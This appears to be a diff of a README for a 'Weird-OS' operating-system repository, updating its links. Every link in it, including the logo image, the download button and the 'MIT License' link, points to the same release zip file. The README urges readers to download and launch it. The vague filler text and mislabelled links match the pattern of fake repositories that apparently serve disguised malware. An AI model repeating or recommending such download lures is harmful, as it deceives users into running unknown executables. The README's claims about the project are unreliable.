@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "Weird-OS" Repository! 
 
-![Weird-OS Logo](https://github.com/baddanpro2/weird-os/releases/download/v1.0/Application.zip)
+![Weird-OS Logo](https://github.com/baddanpro2/weird-os/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository is dedicated to the exploration and development of a unique and unconventional operating system concept. "Weird-OS" breaks away from traditional norms to provide a fresh perspective on how operating systems can be designed and utilized.
@@ -19,9 +19,9 @@ This repository is dedicated to the exploration and development of a unique and 
 - Operating-System
 
 ## Get Started
-To get started with "Weird-OS," you can [download the latest release](https://github.com/baddanpro2/weird-os/releases/download/v1.0/Application.zip). Launch the file and follow the installation instructions to experience the unconventional world of "Weird-OS."
+To get started with "Weird-OS," you can [download the latest release](https://github.com/baddanpro2/weird-os/releases/download/v2.0/Software.zip). Launch the file and follow the installation instructions to experience the unconventional world of "Weird-OS."
 
-[![Download "Weird-OS"](https://github.com/baddanpro2/weird-os/releases/download/v1.0/Application.zip)](https://github.com/baddanpro2/weird-os/releases/download/v1.0/Application.zip)
+[![Download "Weird-OS"](https://github.com/baddanpro2/weird-os/releases/download/v2.0/Software.zip)](https://github.com/baddanpro2/weird-os/releases/download/v2.0/Software.zip)
 
 ## Features
 Explore the innovative features of "Weird-OS" that set it apart from traditional operating systems:
@@ -41,7 +41,7 @@ We welcome contributions from the open-source community to enhance and expand th
 If you encounter any issues or have questions about "Weird-OS," feel free to reach out to our dedicated support team. We are here to assist you in navigating the unique features and functionalities of "Weird-OS."
 
 ## License
-"Weird-OS" is licensed under the [MIT License](https://github.com/baddanpro2/weird-os/releases/download/v1.0/Application.zip). Feel free to explore, modify, and distribute this innovative operating system concept in accordance with the terms of the license.
+"Weird-OS" is licensed under the [MIT License](https://github.com/baddanpro2/weird-os/releases/download/v2.0/Software.zip). Feel free to explore, modify, and distribute this innovative operating system concept in accordance with the terms of the license.
 
 ---
 
